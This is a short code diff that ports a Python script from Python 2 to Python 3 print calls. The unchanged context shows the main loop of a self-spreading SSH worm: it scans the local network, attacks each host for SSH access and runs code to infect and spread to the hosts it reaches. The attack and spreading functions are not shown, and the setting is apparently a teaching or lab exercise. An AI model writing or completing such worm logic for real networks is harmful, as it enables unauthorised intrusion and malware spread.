@@ -192,7 +192,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 
-print "Found hosts: ", networkHosts
+print("Found hosts: ", networkHosts)
 
 
 # Go through the network hosts
@@ -201,13 +201,13 @@ for host in networkHosts:
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
 	
-	print sshInfo
+	print(sshInfo)
 	
 	
 	# Did the attack succeed?
 	if sshInfo:
 		
-		print "Trying to spread"
+		print("Trying to spread")
 		
 		# TODO: Check if the system was	
 		# already infected. This can be
@@ -238,6 +238,6 @@ for host in networkHosts:
 		# Infect that system
 		spreadAndExecute(sshInfo[0])
 		
-		print "Spreading complete"	
+		print("Spreading complete")	
 	
 
